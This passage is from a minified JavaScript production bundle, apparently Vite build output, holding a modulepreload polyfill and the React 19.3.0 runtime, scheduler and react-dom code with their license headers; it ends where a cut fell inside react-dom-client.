(function(){const c=document.createElement("link").relList;if(c&&c.supports&&c.supports("modulepreload"))return;for(const d of document.querySelectorAll('link[rel="modulepreload"]'))o(d);new MutationObserver(d=>{for(const f of d)if(f.type==="childList")for(const g of f.addedNodes)g.tagName==="LINK"&&g.rel==="modulepreload"&&o(g)}).observe(document,{childList:!0,subtree:!0});function r(d){const f={};return d.integrity&&(f.integrity=d.integrity),d.referrerPolicy&&(f.referrerPolicy=d.referrerPolicy),d.crossOrigin==="use-credentials"?f.credentials="include":d.crossOrigin==="anonymous"?f.credentials="omit":f.credentials="same-origin",f}function o(d){if(d.ep)return;d.ep=!0;const f=r(d);fetch(d.href,f)}})();function Fb(l){return l&&l.__esModule&&Object.prototype.hasOwnProperty.call(l,"default")?l.default:l}var Gu={exports:{}},Zi={};/**
 * @license React
 * react-jsx-runtime.production.js
 *
 * Copyright (c) Meta Platforms, Inc. and affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */var em;function Jb(){if(em)return Zi;em=1;var l=Symbol.for("react.transitional.element"),c=Symbol.for("react.fragment");function r(o,d,f){var g=null;if(f!==void 0&&(g=""+f),d.key!==void 0&&(g=""+d.key),"key"in d){f={};for(var y in d)y!=="key"&&(f[y]=d[y])}else f=d;return d=f.ref,{$$typeof:l,type:o,key:g,ref:d!==void 0?d:null,props:f}}return Zi.Fragment=c,Zi.jsx=r,Zi.jsxs=r,Zi}var tm;function Pb(){return tm||(tm=1,Gu.exports=Jb()),Gu.exports}var p=Pb(),qu={exports:{}},se={};/**
 * @license React
 * react.production.js
 *
 * Copyright (c) Meta Platforms, Inc. and affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */var am;function $b(){if(am)return se;am=1;var l=Symbol.for("react.transitional.element"),c=Symbol.for("react.portal"),r=Symbol.for("react.fragment"),o=Symbol.for("react.strict_mode"),d=Symbol.for("react.profiler"),f=Symbol.for("react.consumer"),g=Symbol.for("react.context"),y=Symbol.for("react.forward_ref"),_=Symbol.for("react.suspense"),m=Symbol.for("react.memo"),v=Symbol.for("react.lazy"),b=Symbol.for("react.activity"),w=Symbol.for("react.view_transition"),T=Symbol.iterator;function U(E){return E===null||typeof E!="object"?null:(E=T&&E[T]||E["@@iterator"],typeof E=="function"?E:null)}var G={isMounted:function(){return!1},enqueueForceUpdate:function(){},enqueueReplaceState:function(){},enqueueSetState:function(){}},q=Object.assign,V={};function ee(E,H,P){this.props=E,this.context=H,this.refs=V,this.updater=P||G}ee.prototype.isReactComponent={},ee.prototype.setState=function(E,H){if(typeof E!="object"&&typeof E!="function"&&E!=null)throw Error("takes an object of state variables to update or a function which returns an object of state variables.");this.updater.enqueueSetState(this,E,H,"setState")},ee.prototype.forceUpdate=function(E){this.updater.enqueueForceUpdate(this,E,"forceUpdate")};function W(){}W.prototype=ee.prototype;function M(E,H,P){this.props=E,this.context=H,this.refs=V,this.updater=P||G}var Q=M.prototype=new W;Q.constructor=M,q(Q,ee.prototype),Q.isPureReactComponent=!0;var he=Array.isArray;function B(){}var X={H:null,A:null,T:null,S:null},ie=Object.prototype.hasOwnProperty;function K(E,H,P){var $=P.ref;return{$$typeof:l,type:E,key:H,ref:$!==void 0?$:null,props:P}}function te(E,H){return K(E.type,H,E.props)}function le(E){return typeof E=="object"&&E!==null&&E.$$typeof===l}function be(E){var H={"=":"=0",":":"=2"};return"$"+E.replace(/[=:]/g,function(P){return H[P]})}var Xe=/\/+/g;function _e(E,H){return typeof E=="object"&&E!==null&&E.key!=null?be(""+E.key):H.toString(36)}function k(E){switch(E.status){case"fulfilled":return E.value;case"rejected":throw E.reason;default:switch(typeof E.status=="string"?E.then(B,B):(E.status="pending",E.then(function(H){E.status==="pending"&&(E.status="fulfilled",E.value=H)},function(H){E.status==="pending"&&(E.status="rejected",E.reason=H)})),E.status){case"fulfilled":return E.value;case"rejected":throw E.reason}}throw E}function F(E,H,P,$,ye){var xe=typeof E;(xe==="undefined"||xe==="boolean")&&(E=null);var we=!1;if(E===null)we=!0;else switch(xe){case"bigint":case"string":case"number":we=!0;break;case"object":switch(E.$$typeof){case l:case c:we=!0;break;case v:return we=E._init,F(we(E._payload),H,P,$,ye)}}if(we)return ye=ye(E),we=$===""?"."+_e(E,0):$,he(ye)?(P="",we!=null&&(P=we.replace(Xe,"$&/")+"/"),F(ye,H,P,"",function(ba){return ba})):ye!=null&&(le(ye)&&(ye=te(ye,P+(ye.key==null||E&&E.key===ye.key?"":(""+ye.key).replace(Xe,"$&/")+"/")+we)),H.push(ye)),1;we=0;var I=$===""?".":$+":";if(he(E))for(var re=0;re<E.length;re++)$=E[re],xe=I+_e($,re),we+=F($,H,P,xe,ye);else if(re=U(E),typeof re=="function")for(E=re.call(E),re=0;!($=E.next()).done;)$=$.value,xe=I+_e($,re++),we+=F($,H,P,xe,ye);else if(xe==="object"){if(typeof E.then=="function")return F(k(E),H,P,$,ye);throw H=String(E),Error("Objects are not valid as a React child (found: "+(H==="[object Object]"?"object with keys {"+Object.keys(E).join(", ")+"}":H)+"). If you meant to render a collection of children, use an array instead.")}return we}function ae(E,H,P){if(E==null)return E;var $=[],ye=0;return F(E,$,"","",function(xe){return H.call(P,xe,ye++)}),$}function Ce(E){if(E._status===-1){var H=E._result,P=H();P.then(function($){(E._status===0||E._status===-1)&&(E._status=1,E._result=$,P.status===void 0&&(P.status="fulfilled",P.value=$))},function($){(E._status===0||E._status===-1)&&(E._status=2,E._result=$,P.status===void 0&&(P.status="rejected",P.reason=$))}),E._status===-1&&(E._status=0,E._result=P)}if(E._status===1)return E._result.default;throw E._result}var je=typeof reportError=="function"?reportError:function(E){if(typeof window=="object"&&typeof window.ErrorEvent=="function"){var H=new window.ErrorEvent("error",{bubbles:!0,cancelable:!0,message:typeof E=="object"&&E!==null&&typeof E.message=="string"?String(E.message):String(E),error:E});if(!window.dispatchEvent(H))return}else if(typeof process=="object"&&typeof process.emit=="function"){process.emit("uncaughtException",E);return}console.error(E)};function Kt(E){var H=X.T,P={};P.types=H!==null?H.types:null,X.T=P;try{var $=E(),ye=X.S;ye!==null&&ye(P,$),typeof $=="object"&&$!==null&&typeof $.then=="function"&&$.then(B,je)}catch(xe){je(xe)}finally{H!==null&&P.types!==null&&(H.types=P.types),X.T=H}}function ya(E){var H=X.T;if(H!==null){var P=H.types;P===null?H.types=[E]:P.indexOf(E)===-1&&P.push(E)}else Kt(ya.bind(null,E))}var vn={map:ae,forEach:function(E,H,P){ae(E,function(){H.apply(this,arguments)},P)},count:function(E){var H=0;return ae(E,function(){H++}),H},toArray:function(E){return ae(E,function(H){return H})||[]},only:function(E){if(!le(E))throw Error("React.Children.only expected to receive a single React element child.");return E}};return se.Activity=b,se.Children=vn,se.Component=ee,se.Fragment=r,se.Profiler=d,se.PureComponent=M,se.StrictMode=o,se.Suspense=_,se.ViewTransition=w,se.__CLIENT_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE=X,se.__COMPILER_RUNTIME={__proto__:null,c:function(E){return X.H.useMemoCache(E)}},se.addTransitionType=ya,se.cache=function(E){return function(){return E.apply(null,arguments)}},se.cacheSignal=function(){return null},se.cloneElement=function(E,H,P){if(E==null)throw Error("The argument must be a React element, but you passed "+E+".");var $=q({},E.props),ye=E.key;if(H!=null)for(xe in H.key!==void 0&&(ye=""+H.key),H)!ie.call(H,xe)||xe==="key"||xe==="__self"||xe==="__source"||xe==="ref"&&H.ref===void 0||($[xe]=H[xe]);var xe=arguments.length-2;if(xe===1)$.children=P;else if(1<xe){for(var we=Array(xe),I=0;I<xe;I++)we[I]=arguments[I+2];$.children=we}return K(E.type,ye,$)},se.createContext=function(E){return E={$$typeof:g,_currentValue:E,_currentValue2:E,_threadCount:0,Provider:null,Consumer:null},E.Provider=E,E.Consumer={$$typeof:f,_context:E},E},se.createElement=function(E,H,P){var $,ye={},xe=null;if(H!=null)for($ in H.key!==void 0&&(xe=""+H.key),H)ie.call(H,$)&&$!=="key"&&$!=="__self"&&$!=="__source"&&(ye[$]=H[$]);var we=arguments.length-2;if(we===1)ye.children=P;else if(1<we){for(var I=Array(we),re=0;re<we;re++)I[re]=arguments[re+2];ye.children=I}if(E&&E.defaultProps)for($ in we=E.defaultProps,we)ye[$]===void 0&&(ye[$]=we[$]);return K(E,xe,ye)},se.createRef=function(){return{current:null}},se.forwardRef=function(E){return{$$typeof:y,render:E}},se.isValidElement=le,se.lazy=function(E){return{$$typeof:v,_payload:{_status:-1,_result:E},_init:Ce}},se.memo=function(E,H){return{$$typeof:m,type:E,compare:H===void 0?null:H}},se.startTransition=Kt,se.unstable_useCacheRefresh=function(){return X.H.useCacheRefresh()},se.use=function(E){return X.H.use(E)},se.useActionState=function(E,H,P){return X.H.useActionState(E,H,P)},se.useCallback=function(E,H){return X.H.useCallback(E,H)},se.useContext=function(E){return X.H.useContext(E)},se.useDebugValue=function(){},se.useDeferredValue=function(E,H){return X.H.useDeferredValue(E,H)},se.useEffect=function(E,H){return X.H.useEffect(E,H)},se.useEffectEvent=function(E){return X.H.useEffectEvent(E)},se.useId=function(){return X.H.useId()},se.useImperativeHandle=function(E,H,P){return X.H.useImperativeHandle(E,H,P)},se.useInsertionEffect=function(E,H){return X.H.useInsertionEffect(E,H)},se.useLayoutEffect=function(E,H){return X.H.useLayoutEffect(E,H)},se.useMemo=function(E,H){return X.H.useMemo(E,H)},se.useOptimistic=function(E,H){return X.H.useOptimistic(E,H)},se.useReducer=function(E,H,P){return X.H.useReducer(E,H,P)},se.useRef=function(E){return X.H.useRef(E)},se.useState=function(E){return X.H.useState(E)},se.useSyncExternalStore=function(E,H,P){return X.H.useSyncExternalStore(E,H,P)},se.useTransition=function(){return X.H.useTransition()},se.version="19.3.0",se}var nm;function _f(){return nm||(nm=1,qu.exports=$b()),qu.exports}var ge=_f();const Wb=Fb(ge);var Yu={exports:{}},Xi={},Zu={exports:{}},Xu={};/**
 * @license React
 * scheduler.production.js
 *
 * Copyright (c) Meta Platforms, Inc. and affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */var lm;function e1(){return lm||(lm=1,(function(l){function c(k,F){var ae=k.length;k.push(F);e:for(;0<ae;){var Ce=ae-1>>>1,je=k[Ce];if(0<d(je,F))k[Ce]=F,k[ae]=je,ae=Ce;else break e}}function r(k){return k.length===0?null:k[0]}function o(k){if(k.length===0)return null;var F=k[0],ae=k.pop();if(ae!==F){k[0]=ae;e:for(var Ce=0,je=k.length,Kt=je>>>1;Ce<Kt;){var ya=2*(Ce+1)-1,vn=k[ya],E=ya+1,H=k[E];if(0>d(vn,ae))E<je&&0>d(H,vn)?(k[Ce]=H,k[E]=ae,Ce=E):(k[Ce]=vn,k[ya]=ae,Ce=ya);else if(E<je&&0>d(H,ae))k[Ce]=H,k[E]=ae,Ce=E;else break e}}return F}function d(k,F){var ae=k.sortIndex-F.sortIndex;return ae!==0?ae:k.id-F.id}if(l.unstable_now=void 0,typeof performance=="object"&&typeof performance.now=="function"){var f=performance;l.unstable_now=function(){return f.now()}}else{var g=Date,y=g.now();l.unstable_now=function(){return g.now()-y}}var _=[],m=[],v=1,b=null,w=3,T=!1,U=!1,G=!1,q=!1,V=typeof setTimeout=="function"?setTimeout:null,ee=typeof clearTimeout=="function"?clearTimeout:null,W=typeof setImmediate<"u"?setImmediate:null;function M(k){for(var F=r(m);F!==null;){if(F.callback===null)o(m);else if(F.startTime<=k)o(m),F.sortIndex=F.expirationTime,c(_,F);else break;F=r(m)}}function Q(k){if(G=!1,M(k),!U)if(r(_)!==null)U=!0,he||(he=!0,le());else{var F=r(m);F!==null&&_e(Q,F.startTime-k)}}var he=!1,B=-1,X=5,ie=-1;function K(){return q?!0:!(l.unstable_now()-ie<X)}function te(){if(q=!1,he){var k=l.unstable_now();ie=k;var F=!0;try{e:{U=!1,G&&(G=!1,ee(B),B=-1),T=!0;var ae=w;try{t:{for(M(k),b=r(_);b!==null&&!(b.expirationTime>k&&K());){var Ce=b.callback;if(typeof Ce=="function"){b.callback=null,w=b.priorityLevel;var je=Ce(b.expirationTime<=k);if(k=l.unstable_now(),typeof je=="function"){b.callback=je,M(k),F=!0;break t}b===r(_)&&o(_),M(k)}else o(_);b=r(_)}if(b!==null)F=!0;else{var Kt=r(m);Kt!==null&&_e(Q,Kt.startTime-k),F=!1}}break e}finally{b=null,w=ae,T=!1}F=void 0}}finally{F?le():he=!1}}}var le;if(typeof W=="function")le=function(){W(te)};else if(typeof MessageChannel<"u"){var be=new MessageChannel,Xe=be.port2;be.port1.onmessage=te,le=function(){Xe.postMessage(null)}}else le=function(){V(te,0)};function _e(k,F){B=V(function(){k(l.unstable_now())},F)}l.unstable_IdlePriority=5,l.unstable_ImmediatePriority=1,l.unstable_LowPriority=4,l.unstable_NormalPriority=3,l.unstable_Profiling=null,l.unstable_UserBlockingPriority=2,l.unstable_cancelCallback=function(k){k.callback=null},l.unstable_forceFrameRate=function(k){0>k||125<k?console.error("forceFrameRate takes a positive int between 0 and 125, forcing frame rates higher than 125 fps is not supported"):X=0<k?Math.floor(1e3/k):5},l.unstable_getCurrentPriorityLevel=function(){return w},l.unstable_next=function(k){switch(w){case 1:case 2:case 3:var F=3;break;default:F=w}var ae=w;w=F;try{return k()}finally{w=ae}},l.unstable_requestPaint=function(){q=!0},l.unstable_runWithPriority=function(k,F){switch(k){case 1:case 2:case 3:case 4:case 5:break;default:k=3}var ae=w;w=k;try{return F()}finally{w=ae}},l.unstable_scheduleCallback=function(k,F,ae){var Ce=l.unstable_now();switch(typeof ae=="object"&&ae!==null?(ae=ae.delay,ae=typeof ae=="number"&&0<ae?Ce+ae:Ce):ae=Ce,k){case 1:var je=-1;break;case 2:je=250;break;case 5:je=1073741823;break;case 4:je=1e4;break;default:je=5e3}return je=ae+je,k={id:v++,callback:F,priorityLevel:k,startTime:ae,expirationTime:je,sortIndex:-1},ae>Ce?(k.sortIndex=ae,c(m,k),r(_)===null&&k===r(m)&&(G?(ee(B),B=-1):G=!0,_e(Q,ae-Ce))):(k.sortIndex=je,c(_,k),U||T||(U=!0,he||(he=!0,le()))),k},l.unstable_shouldYield=K,l.unstable_wrapCallback=function(k){var F=w;return function(){var ae=w;w=F;try{return k.apply(this,arguments)}finally{w=ae}}}})(Xu)),Xu}var im;function t1(){return im||(im=1,Zu.exports=e1()),Zu.exports}var Vu={exports:{}},ct={};/**
 * @license React
 * react-dom.production.js
 *
 * Copyright (c) Meta Platforms, Inc. and affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */var rm;function a1(){if(rm)return ct;rm=1;var l=_f();function c(v){var b="https://react.dev/errors/"+v;if(1<arguments.length){b+="?args[]="+encodeURIComponent(arguments[1]);for(var w=2;w<arguments.length;w++)b+="&args[]="+encodeURIComponent(arguments[w])}return"Minified React error #"+v+"; visit "+b+" for the full message or use the non-minified dev environment for full errors and additional helpful warnings."}function r(){}var o={d:{f:r,r:function(){throw Error(c(522))},D:r,C:r,L:r,m:r,X:r,S:r,M:r},p:0,findDOMNode:null},d=Symbol.for("react.portal"),f=Symbol.for("react.recoverable"),g=Symbol.for("react.optimistic_key");function y(v,b,w){var T=3<arguments.length&&arguments[3]!==void 0?arguments[3]:null;return{$$typeof:d,key:T==null?null:T===g?g:""+T,children:v,containerInfo:b,implementation:w}}var _=l.__CLIENT_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE;function m(v,b){if(v==="font")return"";if(typeof b=="string")return b==="use-credentials"?b:""}return ct.__DOM_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE=o,ct.browser=function(v){return{$$typeof:f,_reason:v}},ct.createPortal=function(v,b){var w=2<arguments.length&&arguments[2]!==void 0?arguments[2]:null;if(!b||b.nodeType!==1&&b.nodeType!==9&&b.nodeType!==11)throw Error(c(299));return y(v,b,null,w)},ct.flushSync=function(v){var b=_.T,w=o.p;try{if(_.T=null,o.p=2,v)return v()}finally{_.T=b,o.p=w,o.d.f()}},ct.preconnect=function(v,b){typeof v=="string"&&(b?(b=b.crossOrigin,b=typeof b=="string"?b==="use-credentials"?b:"":void 0):b=null,o.d.C(v,b))},ct.prefetchDNS=function(v){typeof v=="string"&&o.d.D(v)},ct.preinit=function(v,b){if(typeof v=="string"&&b&&typeof b.as=="string"){var w=b.as,T=m(w,b.crossOrigin),U=typeof b.integrity=="string"?b.integrity:void 0,G=typeof b.fetchPriority=="string"?b.fetchPriority:void 0;w==="style"?o.d.S(v,typeof b.precedence=="string"?b.precedence:void 0,{crossOrigin:T,integrity:U,fetchPriority:G}):w==="script"&&o.d.X(v,{crossOrigin:T,integrity:U,fetchPriority:G,nonce:typeof b.nonce=="string"?b.nonce:void 0})}},ct.preinitModule=function(v,b){if(typeof v=="string")if(typeof b=="object"&&b!==null){if(b.as==null||b.as==="script"){var w=m(b.as,b.crossOrigin);o.d.M(v,{crossOrigin:w,integrity:typeof b.integrity=="string"?b.integrity:void 0,nonce:typeof b.nonce=="string"?b.nonce:void 0,fetchPriority:typeof b.fetchPriority=="string"?b.fetchPriority:void 0})}}else b==null&&o.d.M(v)},ct.preload=function(v,b){if(typeof v=="string"&&typeof b=="object"&&b!==null&&typeof b.as=="string"){var w=b.as,T=m(w,b.crossOrigin);o.d.L(v,w,{crossOrigin:T,integrity:typeof b.integrity=="string"?b.integrity:void 0,nonce:typeof b.nonce=="string"?b.nonce:void 0,type:typeof b.type=="string"?b.type:void 0,fetchPriority:typeof b.fetchPriority=="string"?b.fetchPriority:void 0,referrerPolicy:typeof b.referrerPolicy=="string"?b.referrerPolicy:void 0,imageSrcSet:typeof b.imageSrcSet=="string"?b.imageSrcSet:void 0,imageSizes:typeof b.imageSizes=="string"?b.imageSizes:void 0,media:typeof b.media=="string"?b.media:void 0})}},ct.preloadModule=function(v,b){if(typeof v=="string")if(b){var w=m(b.as,b.crossOrigin);o.d.m(v,{as:typeof b.as=="string"&&b.as!=="script"?b.as:void 0,crossOrigin:w,integrity:typeof b.integrity=="string"?b.integrity:void 0,nonce:typeof b.nonce=="string"?b.nonce:void 0,fetchPriority:typeof b.fetchPriority=="string"?b.fetchPriority:void 0})}else o.d.m(v)},ct.requestFormReset=function(v){o.d.r(v)},ct.unstable_batchedUpdates=function(v,b){return v(b)},ct.useFormState=function(v,b,w){return _.H.useFormState(v,b,w)},ct.useFormStatus=function(){return _.H.useHostTransitionStatus()},ct.version="19.3.0",ct}var sm;function n1(){if(sm)return Vu.exports;sm=1;function l(){if(!(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__>"u"||typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE!="function"))try{__REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE(l)}catch(c){console.error(c)}}return l(),Vu.exports=a1(),Vu.exports}/**
 * @license React
 * react-dom-client.production.js
 *
 * Copyright (c) Meta Platforms, Inc. and affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */var cm;function l1(){if(cm)return Xi;cm=1;var l=t1(),c=_f(),r=n1();function o(e){var t="https://react.dev/errors/"+e;if(1<arguments.length){t+="?args[]="+encodeURIComponent(arguments[1]);for(var a=2;a<arguments.length;a++)t+="&args[]="+encodeURIComponent(arguments[a])}return"Minified React error #"+e+"; visit "+t+" for the full message or use the non-minified dev environment for full errors and additional helpful warnings."}function d(e){return!(!e||e.nodeType!==1&&e.nodeType!==9&&e.nodeType!==11)}function f(e){for(var t=e,a=t;a&&!a.alternate;)t=a,(t.flags&4098)!==0&&(e=t.return),a=t.return;for(;t.return;)t=t.return;return t.tag===3?e:null}function g(e){if(e.tag===13){var t=e.memoizedState;if(t===null&&(e=e.alternate,e!==null&&(t=e.memoizedState)),t!==null)return t.dehydrated}return null}function y(e){if(e.tag===31){var t=e.memoizedState;if(t===null&&(e=e.alternate,e!==null&&(t=e.memoizedState)),t!==null)return t.dehydrated}return null}function _(e){if(f(e)!==e)throw Error(o(188))}function m(e){var t=e.alternate;if(!t){if(t=f(e),t===null)throw Error(o(188));return t!==e?null:e}for(var a=e,n=t;;){var i=a.return;if(i===null)break;var s=i.alternate;if(s===null){if(n=i.return,n!==null){a=n;continue}break}if(i.child===s.child){for(s=i.child;s;){if(s===a)return _(i),e;if(s===n)return _(i),t;s=s.sibling}throw Error(o(188))}if(a.return!==n.return)a=i,n=s;else{for(var u=!1,h=i.child;h;){if(h===a){u=!0,a=i,n=s;break}if(h===n){u=!0,n=i,a=s;break}h=h.sibling}if(!u){for(h=s.child;h;){if(h===a){u=!0,a=s,n=i;break}if(h===n){u=!0,n=s,a=i;break}h=h.sibling}if(!u)throw Error(o(189))}}if(a.alternate!==n)throw Error(o(190))}if(a.tag!==3)throw Error(o(188));return a.stateNode.current===a?e:t}function v(e){var t=e.tag;if(t===5||t===26||t===27||t===6)return e;for(e=e.child;e!==null;){if(t=v(e),t!==null)return t;e=e.sibling}return null}function b(e,t,a,n,i,s){for(;e!==null;){if((e.tag===5||e.tag===27||e.tag===6)&&a(e,n,i,s)||(e.tag!==22||e.memoizedState===null)&&(t||e.tag!==5&&e.tag!==27)&&b(e.child,t,a,n,i,s))return!0;e=e.sibling}return!1}function w(e){for(e=e.return;e!==null;){if(e.tag===3||e.tag===5||e.tag===27)return e;e=e.return}return null}function T(e){var t=!1;for(e=e.return;e!==null&&(e.tag===4&&(t=!0),!(e.tag===3||e.tag===5||e.tag===27));)e=e.return;return t}function U(e){var t=[null,null],a=w(e);return a===null||G(t,e,a.child,{foundSelf:!1}),t}function G(e,t,a,n){for(;a!==null;){if(a===t)n.foundSelf=!0;else if(a.tag===5||a.tag===27||a.tag===6){if(n.foundSelf)return e[1]=a,!0;e[0]=a}else if((a.tag!==22||a.memoizedState===null)&&G(e,t,a.child,n))return!0;a=a.sibling}return!1}function q(e){switch(e.tag){case 5:case 27:case 6:return e.stateNode;case 3:return e.stateNode.containerInfo;default:throw Error(o(559))}}var V=null,ee=null;function W(e,t,a){return e===a?!0:e===t?(V=e,!0):!1}function M(e,t,a){return e===a?(ee=e,!1):e===t?(ee!==null&&(V=e),!0):!1}function Q(e){if(e===null)return null;do e=e===null?null:e.return;while(e&&e.tag!==5&&e.tag!==27&&e.tag!==3);return e||null}function he(e,t,a){for(var n=0,i=e;i;i=a(i))n++;i=0;for(var s=t;s;s=a(s))i++;for(;0<n-i;)e=a(e),n--;for(;0<i-n;)t=a(t),i--;for(;n--;){if(e===t||t!==null&&e===t.alternate)return e;e=a(e),t=a(t)}return null}var B=Object.assign,X=Symbol.for("react.element"),ie=Symbol.for("react.transitional.element"),K=Symbol.for("react.portal"),te=Symbol.for("react.fragment"),le=Symbol.for("react.strict_mode"),be=Symbol.for("react.profiler"),Xe=Symbol.for("react.consumer"),_e=Symbol.for("react.context"),k=Symbol.for("react.forward_ref"),F=Symbol.for("react.suspense"),ae=Symbol.for("react.suspense_list"),Ce=Symbol.for("react.memo"),je=Symbol.for("react.lazy"),Kt=Symbol.for("react.activity"),ya=Symbol.for("react.legacy_hidden"),vn=Symbol.for("react.memo_cache_sentinel"),E=Symbol.for("react.view_transition"),H=Symbol.for("react.recoverable"),P=Symbol.iterator;function $(e){return e===null||typeof e!="object"?null:(e=P&&e[P]||e["@@iterator"],typeof e=="function"?e:null)}var ye=Symbol.for("react.client.reference");function xe(e){if(e==null)return null;if(typeof e=="function")return e.$$typeof===ye?null:e.displayName||e.name||null;if(typeof e=="string")return e;switch(e){case te:return"Fragment";case be:return"Profiler";case le:return"StrictMode";case F:return"Suspense";case ae:return"SuspenseList";case Kt:return"Activity";case E:return"ViewTransition"}if(typeof e=="object")switch(e.$$typeof){case K:return"Portal";case _e:return e.displayName||"Context";case Xe:return(e._context.displayName||"Context")+".Consumer";case k:var t=e.render;return e=e.displayName,e||(e=t.displayName||t.name||"",e=e!==""?"ForwardRef("+e+")":"ForwardRef"),e;case Ce:return t=e.displayName||null,t!==null?t:xe(e.type)||"Memo";case je:t=e._payload,e=e._init;try{return xe(e(t))}catch{}}return null}var we=Array.isArray,I=c.__CLIENT_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE,re=r.__DOM_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE,ba={pending:!1,data:null,method:null,action:null},lc=[],Fn=-1;function ea(e){return{current:e}}function tt(e){0>Fn||(e.current=lc[Fn],lc[Fn]=null,Fn--)}function Me(e,t){Fn++,lc[Fn]=e.current,e.current=t}var ta=ea(null),Fl=ea(null),Ba=ea(null),ur=ea(null);function fr(e,t){switch(Me(Ba,t),Me(Fl,e),Me(ta,null),t.nodeType){case 9:case 11:e=(e=t.documentElement)&&(e=e.namespaceURI)?op(e):0;break;default:if(e=t.tagName,t=t.namespaceURI)t=op(t),e=up(t,e);else switch(e){case"svg":e=1;break;case"math":e=2;break;default:e=0}}tt(ta),Me(ta,e)}function Jn(){tt(ta),tt(Fl),tt(Ba)}function ic(e){var t=e.memoizedState;t!==null&&(Bl._currentValue=t.memoizedState,Me(ur,e)),t=ta.current;var a=up(t,e.type);t!==a&&(Me(Fl,e),Me(ta,a))}function dr(e){Fl.current===e&&(tt(ta),tt(Fl)),ur.current===e&&(tt(ur),Bl._currentValue=ba)}var rc,zf;function ka(e){if(rc===void 0)try{throw Error()}catch(a){var t=a.stack.trim().match(/\n( *(at )?)/);rc=t&&t[1]||"",zf=-1<a.stack.indexOf(`
    at`)?" (<anonymous>)":-1<a.stack.indexOf("@")?"@unknown:0:0":""}return`
`+rc+e+zf}var sc=!1;function cc(e,t){if(!e||sc)return"";sc=!0;var a=Error.prepareStackTrace;Error.prepareStackTrace=void 0;try{var n={DetermineComponentFrameRoot:function(){try{if(t){var D=function(){throw Error()};if(Object.defineProperty(D.prototype,"props",{set:function(){throw Error()}}),typeof Reflect=="object"&&Reflect.construct){try{Reflect.construct(D,[])}catch(L){var A=L}Reflect.construct(e,[],D)}else{try{D.call()}catch(L){A=L}D=!1;try{var z=Object.getOwnPropertyDescriptor(e.prototype,"props");Object.defineProperty(e.prototype,"props",{configurable:!0,set:function(){throw Error()}}),D=!0,new e}finally{D&&(z!==void 0?Object.defineProperty(e.prototype,"props",z):delete e.prototype.props)}}}else{try{throw Error()}catch(L){A=L}(D=e())&&typeof D.catch=="function"&&D.catch(function(){})}}catch(L){if(L&&A&&typeof L.stack=="string")return[L.stack,A.stack]}return[null,null]}};n.DetermineComponentFrameRoot.displayName="DetermineComponentFrameRoot";var i=Object.getOwnPropertyDescriptor(n.DetermineComponentFrameRoot,"name");i&&i.configurable&&Object.defineProperty(n.DetermineComponentFrameRoot,"name",{value:"DetermineComponentFrameRoot"});var s=n.DetermineComponentFrameRoot(),u=s[0],h=s[1];if(u&&h){var x=u.split(`
`),N=h.split(`
`);for(i=n=0;n<x.length&&!x[n].includes("DetermineComponentFrameRoot");)n++;for(;i<N.length&&!N[i].includes("DetermineComponentFrameRoot");)i++;if(n===x.length||i===N.length)for(n=x.length-1,i=N.length-1;1<=n&&0<=i&&x[n]!==N[i];)i--;for(;1<=n&&0<=i;n--,i--)if(x[n]!==N[i]){if(n!==1||i!==1)do if(n--,i--,0>i||x[n]!==N[i]){var O=`
`+x[n].replace(" at new "," at ");return e.displayName&&O.includes("<anonymous>")&&(O=O.replace("<anonymous>",e.displayName)),O}while(1<=n&&0<=i);break}}}finally{sc=!1,Error.prepareStackTrace=a}return(a=e?e.displayName||e.name:"")?ka(a):""}function Wg(e,t){switch(e.tag){case 26:case 27:case 5:return ka(e.type);case 16:return ka("Lazy");case 13:return e.child!==t&&t!==null?ka("Suspense Fallback"):ka("Suspense");case 19:return ka("SuspenseList");case 0:case 15:return cc(e.type,!1);case 11:return cc(e.type.render,!1);case 1:return cc(e.type,!0);case 31:return ka("Activity");case 30:return ka("ViewTransition");default:return""}}function Of(e){try{var t="",a=null;do t+=Wg(e,a),a=e,e=e.return;while(e);return t}catch(n){return`
Error generating stack: `+n.message+`
`+n.stack}}var oc=Object.prototype.hasOwnProperty,uc=l.unstable_scheduleCallback,fc=l.unstable_cancelCallback,ev=l.unstable_shouldYield,tv=l.unstable_requestPaint,Tt=l.unstable_now,av=l.unstable_getCurrentPriorityLevel,Rf=l.unstable_ImmediatePriority,Df=l.unstable_UserBlockingPriority,hr=l.unstable_NormalPriority,nv=l.unstable_LowPriority,Uf=l.unstable_IdlePriority,lv=l.log,iv=l.unstable_setDisableYieldValue,Jl=null,wt=null;function La(e){if(typeof lv=="function"&&iv(e),wt&&typeof wt.setStrictMode=="function")try{wt.setStrictMode(Jl,e)}catch{}}var Et=Math.clz32?Math.clz32:cv,rv=Math.log,sv=Math.LN2;function cv(e){return e>>>=0,e===0?32:31-(rv(e)/sv|0)|0}var pr=256,mr=262144,gr=4194304;function yn(e){var t=e&42;if(t!==0)return t;switch(e&-e){case 1:return 1;case 2:return 2;case 4:return 4;case 8:return 8;case 16:return 16;case 32:return 32;case 64:return 64;case 128:return 128;case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:return e&-e;case 262144:case 524288:case 1048576:case 2097152:return e&3932160;case 4194304:case 8388608:case 16777216:case 33554432:return e&62914560;case 67108864:return 67108864;case 134217728:return 134217728;case 268435456:return 268435456;case 536870912:return 536870912;case 1073741824:return 0;default:return e}}function vr(e,t,a){var n=e.pendingLanes;if(n===0)return 0;var i=0,s=e.suspendedLanes,u=e.pingedLanes;e=e.warmLanes;var h=n&134217727;return 